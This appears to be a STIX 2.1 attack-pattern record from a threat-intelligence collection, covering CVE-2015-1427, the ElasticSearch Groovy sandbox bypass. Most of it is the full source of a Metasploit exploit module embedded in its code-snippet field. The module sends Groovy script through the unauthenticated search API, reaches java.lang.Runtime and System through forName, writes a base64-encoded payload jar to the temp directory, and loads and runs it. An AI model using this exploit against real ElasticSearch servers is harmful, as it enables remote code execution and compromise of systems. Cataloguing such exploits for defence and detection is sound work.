{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--db39c55d-6a46-42a0-a97b-60198009795f",
    "created": "2024-08-14T17:05:16.147453Z",
    "modified": "2024-08-14T17:05:16.147457Z",
    "name": "ElasticSearch Search Groovy Sandbox Bypass",
    "description": " This module exploits a remote command execution (RCE) vulnerability in ElasticSearch exploitable by default on ElasticSearch prior to 1.4.3. The bug is found in the REST API, which does not require authentication, where the search function allows groovy code execution and its sandbox can be bypassed using java.lang.Math.class.forName to reference arbitrary classes. It can be used to execute arbitrary Java code. This module has been tested successfully on ElasticSearch 1.4.2 on Ubuntu Server 12.04. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/elasticsearch/search_groovy_script.rb",
            "external_id": "search_groovy_script.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2015-1427"
        },
        {
            "source_name": "reference",
            "url": "https://jordan-wright.github.io/blog/2015/03/08/elasticsearch-rce-vulnerability-cve-2015-1427/"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/XiphosResearch/exploits/tree/master/ElasticSearch"
        },
        {
            "source_name": "reference",
            "url": "http://drops.wooyun.org/papers/5107"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::FileDropper\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'ElasticSearch Search Groovy Sandbox Bypass',\n      'Description'    => %q{\n        This module exploits a remote command execution (RCE) vulnerability in ElasticSearch,\n        exploitable by default on ElasticSearch prior to 1.4.3. The bug is found in the\n        REST API, which does not require authentication, where the search function allows\n        groovy code execution and its sandbox can be bypassed using java.lang.Math.class.forName\n        to reference arbitrary classes. It can be used to execute arbitrary Java code. This\n        module has been tested successfully on ElasticSearch 1.4.2 on Ubuntu Server 12.04.\n      },\n      'Author'         =>\n        [\n          'Cameron Morris', # Vulnerability discovery\n          'Darren Martyn', # Public Exploit\n          'juan vazquez'   # Metasploit module\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['CVE', '2015-1427'],\n          ['URL', 'https://jordan-wright.github.io/blog/2015/03/08/elasticsearch-rce-vulnerability-cve-2015-1427/'],\n          ['URL', 'https://github.com/XiphosResearch/exploits/tree/master/ElasticSearch'],\n          ['URL', 'http://drops.wooyun.org/papers/5107']\n        ],\n      'Platform'       => 'java',\n      'Arch'           => ARCH_JAVA,\n      'Targets'        =>\n        [\n          ['ElasticSearch 1.4.2', {}]\n        ],\n      'DisclosureDate' => '2015-02-11',\n      'DefaultTarget' => 0))\n\n      register_options(\n        [\n          Opt::RPORT(9200),\n          OptString.new('TARGETURI', [true, 'The path to the ElasticSearch REST API', \"/\"])\n        ])\n  end\n\n  def check\n    result = Exploit::CheckCode::Safe\n\n    if vulnerable?\n      result = Exploit::CheckCode::Vulnerable\n    end\n\n    result\n  end\n\n  def exploit\n    print_status(\"Checking vulnerability...\")\n    unless vulnerable?\n      fail_with(Failure::Unknown, \"#{peer} - Java has not been executed, aborting...\")\n    end\n\n    print_status(\"Discovering TEMP path...\")\n    res = execute(java_tmp_dir)\n    tmp_dir = parse_result(res)\n    if tmp_dir.nil?\n      fail_with(Failure::Unknown, \"#{peer} - Could not identify TEMP path...\")\n    else\n      print_good(\"TEMP path on '#{tmp_dir}'\")\n    end\n\n    print_status(\"Discovering remote OS...\")\n    res = execute(java_os)\n    os = parse_result(res)\n    if os.nil?\n      fail_with(Failure::Unknown, \"#{peer} - Could not identify remote OS...\")\n    else\n      print_good(\"Remote OS is '#{os}'\")\n    end\n\n    if os =~ /win/i\n      tmp_file = \"#{tmp_dir}#{rand_text_alpha(4 + rand(4))}.jar\"\n    else\n      tmp_file = File.join(tmp_dir, \"#{rand_text_alpha(4 + rand(4))}.jar\")\n    end\n\n    register_files_for_cleanup(tmp_file)\n\n    print_status(\"Trying to load metasploit payload...\")\n    java = java_load_class(os, tmp_file)\n    execute(java)\n  end\n\n  def vulnerable?\n    java = 'java.lang.Math.class.forName(\"java.lang.Runtime\")'\n\n    vprint_status(\"Trying to get a reference to java.lang.Runtime...\")\n    res = execute(java)\n    result = parse_result(res)\n\n    if result.nil?\n      vprint_status(\"no response to test\")\n      return false\n    elsif result == 'class java.lang.Runtime'\n      return true\n    end\n\n    false\n  end\n\n  def parse_result(res)\n    unless res\n      vprint_error(\"No response\")\n      return nil\n    end\n\n    unless res.code == 200 && res.body\n      vprint_error(\"Target answered with HTTP code #{res.code} (with#{res.body ? '' : 'out'} a body)\")\n      return nil\n    end\n\n    begin\n      json = JSON.parse(res.body.to_s)\n    rescue JSON::ParserError\n      return nil\n    end\n\n    begin\n      result = json['hits']['hits'][0]['fields']['msf_result']\n    rescue\n      return nil\n    end\n\n    result.is_a?(::Array) ? result.first : result\n  end\n\n  def java_tmp_dir\n    'java.lang.Math.class.forName(\"java.lang.System\").getProperty(\"java.io.tmpdir\")'\n  end\n\n  def java_os\n    'java.lang.Math.class.forName(\"java.lang.System\").getProperty(\"os.name\")'\n  end\n\n  def java_load_class(os, tmp_file)\n    if os =~ /win/i\n      tmp_file.gsub!(/\\\\/, '\\\\\\\\\\\\\\\\')\n    end\n\n    java = [\n      'c=java.lang.Math.class.forName(\"java.io.FileOutputStream\");',\n      'b64=java.lang.Math.class.forName(\"sun.misc.BASE64Decoder\");',\n      \"i=c.getDeclaredConstructor(String.class).newInstance(\\\"#{tmp_file}\\\");\",\n      'b64_i=b64.newInstance();',\n      \"i.write(b64_i.decodeBuffer(\\\"#{Rex::Text.encode_base64(payload.encoded)}\\\"));\",\n      'loader_class=java.lang.Math.class.forName(\"java.net.URLClassLoader\");',\n      'file_class=java.lang.Math.class.forName(\"java.io.File\");',\n      \"file_url=file_class.getDeclaredConstructor(String.class).newInstance(\\\"#{tmp_file}\\\").toURI().toURL();\",\n      'loader=loader_class.newInstance();',\n      'loader.addURL(file_url);',\n      'm=loader.loadClass(\\'metasploit.Payload\\');',\n      'm.main(null);'\n    ]\n\n    java.join\n  end\n\n  def execute(java, timeout = 20)\n    payload = {\n      \"size\" => 1,\n      \"query\" => {\n        \"filtered\" => {\n          \"query\" => {\n            \"match_all\" => {}\n          }\n        }\n      },\n      \"script_fields\" => {\n        \"msf_result\" => {\n          \"script\" => java,\n          \"lang\" => \"groovy\"\n        }\n      }\n    }\n\n    res = send_request_cgi({\n      'uri'    => normalize_uri(target_uri.path.to_s, \"_search\"),\n      'method' => 'POST',\n      'data'   => JSON.generate(payload)\n    }, timeout)\n\n    res\n  end\nend\n",
    "x_mitre_disclosure_date": "2015-02-11",
    "x_mitre_platforms": [
        "java'"
    ]
}